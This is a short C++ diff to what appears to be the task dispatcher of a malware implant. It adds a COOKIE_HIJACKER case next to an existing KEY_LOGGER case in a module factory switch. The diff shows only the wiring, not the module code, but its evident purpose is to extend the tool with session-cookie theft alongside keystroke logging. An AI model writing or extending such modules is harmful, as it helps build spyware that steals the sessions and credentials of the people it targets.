@@ -25,6 +25,9 @@ Task * Task::BuildTask(const std::string & module_name, const json & args)
     case supported_modules::KEY_LOGGER:
         module_derived = new KeyLogger(module_name, args);
         break;
+    case supported_modules::COOKIE_HIJACKER:
+        module_derived = new CookieHijacker(module_name, args);
+        break;
 
     default:
         break;
